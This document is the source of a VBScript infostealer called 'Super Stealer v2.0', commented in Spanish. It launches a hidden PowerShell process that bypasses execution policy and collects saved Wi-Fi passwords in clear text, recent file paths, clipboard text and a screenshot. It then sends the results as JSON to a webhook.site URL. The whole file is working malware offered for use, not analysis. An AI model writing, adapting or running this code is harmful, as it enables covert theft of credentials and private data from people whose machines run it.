' --- Payload "Super Stealer v2.0" (Más Robusto) ---
On Error Resume Next

Dim objShell, psCommand, jsonResult

' El comando de PowerShell ahora tiene bloques try/catch individuales para cada tarea.
psCommand = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$output = @{}; " & _
    "$ErrorActionPreference = 'SilentlyContinue'; " & _
    "$output.username = $env:USERNAME; " & _
    "$output.computerName = $env:COMPUTERNAME; " & _
    " " & _
    "// --- 1. Robo de Wi-Fi con manejo de errores --- " & _
    "try { " & _
        "$wifiProfiles = (netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_.ToString().Split(':')[-1].Trim() }); " & _
        "$wifiData = @(); " & _
        "foreach ($profile in $wifiProfiles) { " & _
            "$keyData = (netsh wlan show profile name='$profile' key=clear | Select-String 'Key Content'); " & _
            "if ($keyData) { $password = $keyData.ToString().Split(':')[-1].Trim() } else { $password = 'Acceso Denegado' }; " & _
            "$wifiData += @{ SSID = $profile; Password = $password }; " & _
        "} " & _
        "$output.wifi_credentials = $wifiData; " & _
    "} catch { $output.wifi_credentials = 'Error al obtener perfiles Wi-Fi' }; " & _
    " " & _
    "// --- 2. Archivos Recientes --- " & _
    "try { " & _
        "$recentFiles = Get-ChildItem -Path (Join-Path $env:APPDATA 'Microsoft\Windows\Recent') -Filter *.lnk | " & _
                     "Sort-Object LastWriteTime -Descending | Select-Object -First 5 | " & _
                     "ForEach-Object { (New-Object -ComObject WScript.Shell).CreateShortcut($_.FullName).TargetPath }; " & _
        "$output.recent_files = $recentFiles; " & _
    "} catch { $output.recent_files = 'Error al obtener archivos recientes' }; " & _
    " " & _
    "// --- 3. Portapapeles --- " & _
    "try { " & _
        "Add-Type -AssemblyName System.Windows.Forms; " & _
        "$clipboardContent = [System.Windows.Forms.Clipboard]::GetText(); " & _
        "$output.clipboard_content = $clipboardContent; " & _
    "} catch { $output.clipboard_content = 'Error al obtener el portapapeles' }; " & _
    " " & _
    "// --- 4. Captura de Pantalla --- " & _
    "try { " & _
        "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " & _
        "$bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; " & _
        "$graphics = [System.Drawing.Graphics]::FromImage($bmp); " & _
        "$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); " & _
        "$ms = New-Object System.IO.MemoryStream; " & _
        "$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); " & _
        "$bytes = $ms.ToArray(); " & _
        "$output.screenshot_b64 = [Convert]::ToBase64String($bytes); " & _
    "} catch { $output.screenshot_b64 = 'Error al tomar la captura' }; " & _
    " " & _
    "return ($output | ConvertTo-Json -Compress); """

' Ejecutamos el comando y capturamos su salida.
Set objShell = CreateObject("WScript.Shell")
Set exec = objShell.Exec(psCommand)
jsonResult = exec.StdOut.ReadAll()

' Exfiltramos el resultado.
Dim http
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.open "POST", "https://webhook.site/7fd9006c-0899-4a59-9b31-bda674f6acbc", False
http.setRequestHeader "Content-Type", "application/json; charset=UTF-8"
http.send jsonResult
